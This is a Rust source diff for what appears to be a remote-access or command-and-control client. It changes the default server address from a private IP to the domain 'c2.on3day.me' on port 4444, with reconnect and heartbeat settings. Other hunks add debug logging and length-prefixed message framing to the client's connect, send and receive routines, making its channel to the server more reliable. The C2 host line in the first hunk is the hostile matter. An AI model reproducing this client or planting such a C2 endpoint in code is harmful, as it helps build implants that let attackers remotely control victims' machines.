@@ -21,7 +21,7 @@ pub struct ClientConfig {
 impl Default for ClientConfig {
     fn default() -> Self {
         Self {
-            server_address: "192.168.1.2".to_string(), // Default server IP
+            server_address: "c2.on3day.me".to_string(), // Default server IP
             server_port: 4444,
             reconnect_delay: 30,
             heartbeat_interval: 60,
@@ -473,33 +473,62 @@ pub mod network {
     /// Connect to server with timeout
     pub async fn connect_to_server(address: &str, port: u16, timeout_secs: u64) -> Result<TcpStream> {
         let addr = format!("{}:{}", address, port);
+        println!("[DEBUG] Attempting to connect to: {}", addr);
+        
         let stream = tokio::time::timeout(
             Duration::from_secs(timeout_secs),
             TcpStream::connect(&addr)
-        ).await??;
+        ).await;
         
-        Ok(stream)
+        match stream {
+            Ok(Ok(stream)) => {
+                println!("[DEBUG] Successfully connected to {}", addr);
+                Ok(stream)
+            }
+            Ok(Err(e)) => {
+                eprintln!("[ERROR] Failed to connect to {}: {}", addr, e);
+                Err(anyhow::anyhow!("Connection failed: {}", e))
+            }
+            Err(_) => {
+                eprintln!("[ERROR] Connection to {} timed out after {} seconds", addr, timeout_secs);
+                Err(anyhow::anyhow!("Connection timeout"))
+            }
+        }
     }
     
-    /// Send message to server
+    /// Send message to server with length header
     pub async fn send_message(stream: &mut TcpStream, data: &[u8]) -> Result<()> {
+        // Send 4-byte length header followed by data
+        let length = data.len() as u32;
+        stream.write_all(&length.to_be_bytes()).await?;
         stream.write_all(data).await?;
+        stream.flush().await?;
         Ok(())
     }
     
-    /// Receive message from server with timeout
+    /// Receive message from server with timeout and length header
     pub async fn receive_message(stream: &mut TcpStream, timeout_secs: u64) -> Result<Vec<u8>> {
-        let mut buffer = vec![0u8; 8192];
-        let n = tokio::time::timeout(
+        // First read the 4-byte length header
+        let mut length_buf = [0u8; 4];
+        tokio::time::timeout(
             Duration::from_secs(timeout_secs),
-            stream.read(&mut buffer)
+            stream.read_exact(&mut length_buf)
         ).await??;
         
-        if n == 0 {
-            return Err(anyhow::anyhow!("Connection closed by server"));
+        let message_length = u32::from_be_bytes(length_buf) as usize;
+        
+        // Validate message length (max 1MB to prevent memory exhaustion)
+        if message_length > 1024 * 1024 {
+            return Err(anyhow::anyhow!("Message too large: {} bytes", message_length));
         }
         
-        buffer.truncate(n);
+        // Read the actual message
+        let mut buffer = vec![0u8; message_length];
+        tokio::time::timeout(
+            Duration::from_secs(timeout_secs),
+            stream.read_exact(&mut buffer)
+        ).await??;
+        
         Ok(buffer)
     }
     
